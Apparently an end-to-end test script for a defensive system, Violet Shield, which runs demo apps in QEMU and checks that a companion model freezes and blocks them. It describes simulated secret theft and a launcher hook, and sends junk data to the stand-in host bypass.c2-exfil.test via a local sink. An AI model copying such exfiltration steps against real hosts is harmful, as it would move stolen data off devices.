"""Violet Shield end to end: VioletOS in QEMU, the companion on the Mac or in the iOS Simulator.

    build/shield/venv/bin/python targets/qemu/test_shield.py --companion ios|sim [--record DIR]

QEMU runs the Open Runtime with the apps in apps/shield-demo. Every TCP
connection the guest makes goes through the companion's SOCKS5 relay
(tools/net_relay.py, VIOLET_NET_SOCKS), exactly like Phone Internet mode on the
handset, and the Sentinel links to `sentinel.violet` on the companion.

  --companion ios  Violet Relay in the iOS Simulator (the real Swift app with the
                   CoreML student and its signer). Build it first (see
                   docs/violet-shield-poc.md); this script installs and launches it.
  --companion sim  tools/shield-trainer/companion_sim.py with the same model in
                   PyTorch, for runs without Xcode.

A scripted viewer taps through the demo and checks the Open Runtime's log:
  1. notes, weather: ordinary apps; nothing is blocked.
  2. photosync: reads another app's secrets and uploads from the background; the
     model flags it, the relay cuts the upload, and VioletOS freezes it on a
     signed Shield, then thaws it when the Shield's TTL runs out.
  3. themes: maps W+X memory, then writes into /apps/launcher: frozen inside the
     write call by a baseline Shield the companion signed when it linked.
  4. A connection that reaches the relay without the Sentinel reporting it
     (telemetry missing or tampered) is blocked as unattributed.
Then it checks the companion's status (verdicts) and that the sink received
less than the 4 MiB photosync tried to send.
"""
from __future__ import annotations

import argparse
import base64
import http.server
import json
import os
import socket
import socketserver
import subprocess
import sys
import threading
import time
from pathlib import Path
from tempfile import TemporaryDirectory

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "tools"))
import run  # noqa: E402

SIM = os.environ.get("VIOLET_SIM", "D4AE7E80-FFC5-4AD7-B810-33E3FFD396EA")
BUNDLE = "com.immortal.violet.relay"
APPS = ["notes", "photosync", "themes", "weather"]  # as /APPS lists them (sorted)
FREEZE_TTL = 30

SCRIPT = r'''#!PYTHON
import json, mmap, os, socket, struct, sys, time
ram = open(sys.argv[1], "r+b")
log = mmap.mmap(ram.fileno(), 0x10000, offset=0x49220000 - 0x40000000)
screen = mmap.mmap(ram.fileno(), 720 * 1600 * 4, offset=0x79450000 - 0x40000000, prot=mmap.PROT_READ)
APPS = json.loads(os.environ["SHIELD_APPS"])
STATUS = os.environ["SHIELD_STATUS"]
SOCKS = int(os.environ["SHIELD_SOCKS_PORT"])
REC = os.environ.get("SHIELD_RECORD")
TTL = int(os.environ["SHIELD_TTL"])
frames = open(os.path.join(REC, "qemu.bgra"), "wb") if REC else None
events = open(os.path.join(REC, "qemu.jsonl"), "w") if REC else None
t0 = time.time()
last_frame = 0.0
caption_text = ""

def text():
    n = struct.unpack_from("<I", log, 4)[0]
    data = bytes(log[8:4096])
    if n <= len(data):
        return data[:n].decode(errors="replace")
    s = n % len(data)
    return (data[s:] + data[:s]).decode(errors="replace")
seen = ""
def everything():
    global seen
    t = text()
    for k in range(min(len(seen), len(t)), 0, -1):
        if seen.endswith(t[:k]):
            seen += t[k:]
            return seen
    seen += t
    return seen
def frame():
    # Half-size frames for the demo video, about 6 a second.
    global last_frame
    if not frames or time.time() - last_frame < 0.16:
        return
    last_frame = time.time()
    import numpy as np
    a = np.frombuffer(screen, dtype=np.uint8).reshape(1600, 720, 4)[::2, ::2]
    frames.write(a.tobytes())
    events.write(json.dumps({"t": round(time.time() - t0, 3), "caption": caption_text,
                             "log": everything().splitlines()[-14:]}) + "\n")
def caption(s):
    global caption_text
    caption_text = s
    print("shield demo:", s, file=sys.stderr)
def fail(why):
    print("shield test failed:", why, "\n--- log ---\n" + everything()[-6000:], file=sys.stderr)
    sys.exit(1)
def until(what, check, timeout=30.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if check():
            return
        frame()
        time.sleep(0.04)
    fail(what)
def hold(seconds):
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        frame()
        time.sleep(0.04)
def tap(x, y):
    os.write(1, bytes([9, x >> 4, y >> 4, ((x & 15) << 4) | (y & 15), 1, 1]))
    hold(.15); os.write(1, bytes(6)); hold(.35)
def pixel(x, y):
    return struct.unpack_from("<I", screen, (y * 720 + x) * 4)[0]
def on_list():
    return pixel(60, 300) == 0xff302a39 and pixel(5, 5) == 0xff191620
def open_apps():
    tap(570, 400)
    until("app list", on_list)
def back_to_list():
    # Holding the top edge for a second leaves the app in front (even a frozen one).
    os.write(1, bytes([9, 360 >> 4, 20 >> 4, ((360 & 15) << 4) | (20 & 15), 1, 1]))
    hold(1.4); os.write(1, bytes(6)); hold(.5)
    until("app list", on_list, 10)
def start(name):
    tap(360, 260 + APPS.index(name) * 110 + 48)
def status():
    try:
        return json.load(open(STATUS))
    except (OSError, ValueError):
        return {}
def decisions(app):
    return [d for d in status().get("decisions", []) if d.get("app") == app]
def count(s):
    return everything().count(s)

until("Open Runtime ready", lambda: "[open] ready" in everything(), 90)
caption("VioletOS boots on seL4 in QEMU; its Sentinel links to the iPhone companion")
until("Sentinel links to the companion", lambda: "sentinel: linked" in everything(), 90)
until("baseline Shields verified", lambda: count("installed") >= 3, 30)
hold(2)
open_apps()
caption("The companion signed 3 baseline Shields; VioletOS verified them with BearSSL P-256")
hold(3)

caption("notes: an ordinary app saves notes (with an API key) and syncs to its server")
start("notes")
until("notes runs", lambda: "notes done" in everything(), 90)
until("list after notes", on_list, 15)
caption("weather: an ordinary app fetches a forecast")
start("weather")
until("weather runs", lambda: "weather done" in everything(), 90)
until("list after weather", on_list, 15)
caption("The companion scores each app's telemetry window on the phone: benign, nothing blocked")
until("benign verdicts", lambda: decisions("notes") and decisions("weather"), 45)
hold(3)

frozen_before = count("froze pid")
caption("photosync: 'syncs photos', then quietly reads notes' secrets...")
start("photosync")
until("photosync hides", lambda: "going to the background" in everything(), 90)
hold(1.5)
open_apps()
caption("...slips into the background and uploads 4 MiB to drop.c2-exfil.test")
until("photosync frozen by a signed Shield", lambda: count("froze pid") > frozen_before, 120)
caption("Model on the iPhone: exfiltration. Relay cut the upload; VioletOS froze photosync mid-call")
hold(6)
caption(f"The freeze is reversible and TTL-bounded: it thaws on its own after {TTL} s")
until("photosync thaws", lambda: "thawed pid" in everything(), TTL + 30)
until("photosync's upload fails", lambda: "photosync: upload stopped" in everything() or "photosync (pid" in everything(), 60)
hold(2)

frozen_before = count("froze pid")
caption("themes: maps W+X memory, then tries to plant a hook inside /apps/launcher")
until("list", on_list, 30)
start("themes")
until("themes frozen inside its write", lambda: count("froze pid") > frozen_before, 60)
caption("Frozen inside the write call by a baseline Shield: the hook never lands")
hold(5)
back_to_list()
hold(4)

caption("A connection the Sentinel never reported (tampered telemetry) reaches the relay...")
s = socket.create_connection(("127.0.0.1", SOCKS), timeout=10)
s.sendall(b"\x05\x01\x02"); s.recv(2)
user, pw = b"violet", os.environ["SHIELD_PASS"].encode()
s.sendall(bytes([1, len(user)]) + user + bytes([len(pw)]) + pw); s.recv(2)
host = b"bypass.c2-exfil.test"
s.sendall(b"\x05\x01\x00\x03" + bytes([len(host)]) + host + struct.pack(">H", 443))
s.recv(10)
try:
    s.sendall(b"x" * 20000)
except OSError:
    pass
until("unreported connection blocked", lambda: decisions("unattributed"), 40)
caption("...and is blocked as unattributed: the relay is a second, independent ground truth")
hold(6)
s.close()
caption("Violet Shield: local model, signed live Shields, zero reboots")
hold(3)
print("shield scripted run complete", file=sys.stderr)
'''


def sink_server():
    """drop.c2-exfil.test and bypass.c2-exfil.test: count what arrives, keep nothing."""
    got = {"bytes": 0}

    class Sink(socketserver.BaseRequestHandler):
        def handle(self):
            while True:
                d = self.request.recv(65536)
                if not d:
                    break
                got["bytes"] += len(d)

    srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Sink)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, got


def web_server():
    class Page(http.server.BaseHTTPRequestHandler):
        def reply(self):
            body = b'{"city": "Violet Bay", "forecast": "sunny, 21C"}' if "forecast" in self.path else b"OK synced\n"
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        do_GET = reply

        def do_POST(self):
            self.rfile.read(int(self.headers.get("Content-Length") or 0))
            self.reply()

        def log_message(self, *a):
            pass

    srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Page)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def build_image(out: Path):
    env = dict(os.environ, VIOLET_OPEN_APPS_DIR=str(ROOT / "apps/shield-demo"))
    subprocess.run([sys.executable, str(ROOT / "tools/build_initfs.py"), str(out)], env=env, check=True)


def start_ios(host_map, record_dir):
    key = subprocess.check_output(["openssl", "pkcs8", "-topk8", "-nocrypt", "-in", str(ROOT / "build/shield/companion-signing.pem"), "-outform", "DER"])
    subprocess.run(["xcrun", "simctl", "bootstatus", SIM, "-b"], check=True, capture_output=True)
    data = Path(subprocess.check_output(["xcrun", "simctl", "get_app_container", SIM, BUNDLE, "data"], text=True).strip())
    for name in ("shield-status.json", "status.json"):
        (data / "Documents" / name).unlink(missing_ok=True)
    video = None
    if record_dir:
        video = subprocess.Popen(["xcrun", "simctl", "io", SIM, "recordVideo", "--codec", "h264", "--force", str(record_dir / "ios.mp4")],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1.5)
        (record_dir / "ios.start").write_text(str(time.time()))
    # Grant notifications up front so the permission alert does not cover the recording.
    subprocess.run(["xcrun", "simctl", "privacy", SIM, "grant", "notifications", BUNDLE], capture_output=True)
    subprocess.run(["xcrun", "simctl", "launch", "--terminate-running-process", SIM, BUNDLE, "-pairingSecret", "violet-dev", "-upstream", "any",
                    "-shieldDevKey", base64.b64encode(key).decode(), "-shieldFreezeTTL", str(FREEZE_TTL), "-shieldComputeUnits", "gpu",
                    "-hostMapB64", base64.b64encode(json.dumps(host_map).encode()).decode()], check=True, capture_output=True)
    status = data / "Documents/status.json"
    deadline = time.time() + 60
    while time.time() < deadline:
        try:
            st = json.loads(status.read_text())
            shield = json.loads((data / "Documents/shield-status.json").read_text())
            if st.get("listenerState") == "listening" and st.get("port") and "hybrid head" in shield.get("model", ""):
                return st["port"], data / "Documents/shield-status.json", video
        except (OSError, ValueError):
            pass
        time.sleep(0.5)
    raise SystemExit("Violet Relay did not start listening with its model loaded in the Simulator")


def start_sim(host_map, tmp: Path):
    port = free_port()
    status = tmp / "shield-status.json"
    proc = subprocess.Popen([str(ROOT / "build/shield/venv/bin/python"), str(ROOT / "tools/shield-trainer/companion_sim.py"), "--port", str(port),
                             "--model", "--status", str(status), "--ttl", str(FREEZE_TTL), "--host-map", json.dumps(host_map),
                             "--record", str(tmp / "records.jsonl")])
    deadline = time.time() + 120
    while time.time() < deadline:
        try:
            socket.create_connection(("127.0.0.1", port), timeout=1).close()
            return port, status, proc
        except OSError:
            time.sleep(0.5)
    raise SystemExit("companion_sim did not start")


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--companion", choices=["ios", "sim"], default="ios")
    ap.add_argument("--record", help="directory for the demo recording (frames, captions, Simulator video)")
    args = ap.parse_args()
    original = ROOT / "build/sel4/qemu"
    if not (original / "zImage").exists():
        raise SystemExit("Build the QEMU image first (make qemu-image).")
    record = Path(args.record).resolve() if args.record else None
    if record:
        record.mkdir(parents=True, exist_ok=True)
    (ROOT / "build/shield/qemu-traces").mkdir(parents=True, exist_ok=True)
    sink, got = sink_server()
    web = web_server()
    host_map = {"drop.c2-exfil.test": f"127.0.0.1:{sink.server_address[1]}", "bypass.c2-exfil.test": f"127.0.0.1:{sink.server_address[1]}",
                "api.weather.test": f"127.0.0.1:{web.server_address[1]}", "sync.notes.test": f"127.0.0.1:{web.server_address[1]}"}
    with TemporaryDirectory(prefix="vs-", dir=os.environ.get("TMPDIR", "/tmp")) as tmp:
        tmp = Path(tmp)
        image = tmp / "image"
        image.mkdir()
        for name in ("zImage", "handoff.dtb", "entry.bin"):
            (image / name).symlink_to(original / name)
        build_image(image / "initfs.cpio")
        run.IMAGE = image
        # machine() took build/sel4/qemu as its default when tools/run.py was imported.
        import functools
        run.machine = functools.partial(run.machine, image)
        helper = None
        if args.companion == "ios":
            port, status, helper = start_ios(host_map, record)
        else:
            port, status, helper = start_sim(host_map, tmp)
        viewer = tmp / "viewer.py"
        viewer.write_text(SCRIPT.replace("#!PYTHON", "#!" + str(ROOT / "build/shield/venv/bin/python")))
        viewer.chmod(0o755)
        os.environ.update(VIOLET_NET_SOCKS=f"127.0.0.1:{port}", VIOLET_NET_SOCKS_PASS="violet-dev", SHIELD_APPS=json.dumps(APPS),
                          SHIELD_STATUS=str(status), SHIELD_SOCKS_PORT=str(port), SHIELD_PASS="violet-dev", SHIELD_TTL=str(FREEZE_TTL))
        if record:
            os.environ["SHIELD_RECORD"] = str(record)
            (record / "qemu.start").write_text(str(time.time()))
        try:
            code = run.main(str(viewer))
        finally:
            if helper is not None:
                if args.companion == "ios":
                    helper.send_signal(2)
                    helper.wait(timeout=20)
                else:
                    helper.terminate()
        st = json.loads(Path(status).read_text())
        if record:
            (record / "shield-status.json").write_text(json.dumps(st, indent=1))
    problems = []
    if code != 0:
        problems.append(f"scripted run exited with {code}")
    by_app = {}
    for d in st.get("decisions", []):
        by_app.setdefault(d["app"], []).append(d)
    for benign in ("notes", "weather"):
        if any(d.get("contained") for d in by_app.get(benign, [])):
            problems.append(f"{benign} was contained: {by_app[benign]}")
    if not any(d.get("contained") and d.get("tier") == "model" for d in by_app.get("photosync", [])):
        problems.append(f"photosync was not contained by the model: {by_app.get('photosync')}")
    if not any(d.get("contained") for d in by_app.get("unattributed", [])):
        problems.append("the unreported connection was not blocked")
    if got["bytes"] >= 4 * 1024 * 1024:
        problems.append(f"the sink received the whole upload ({got['bytes']} bytes)")
    if st.get("shields_rejected"):
        problems.append(f"VioletOS rejected {st['shields_rejected']} Shields")
    print(f"sink received {got['bytes'] // 1024} KiB of photosync's 4096 KiB", file=sys.stderr)
    for app, ds in sorted(by_app.items()):
        d = next((x for x in ds if x.get("contained")), ds[0])
        print(f"  {app:12s} {d['tier']:6s} {d['verdict']:22s} p_mal={d['p_malicious']:.2f} {d['action']:10s}"
              f" {'CONTAINED' if d.get('contained') else ''} {d.get('note', '')[:90]}", file=sys.stderr)
    print(f"  shields sent {st.get('shields_sent')} verified {st.get('shields_accepted')} rejected {st.get('shields_rejected')}", file=sys.stderr)
    if problems:
        print("Violet Shield test FAILED:\n  " + "\n  ".join(problems), file=sys.stderr)
        sys.exit(1)
    print("Violet Shield verified end to end", file=sys.stderr)


if __name__ == "__main__":
    main()
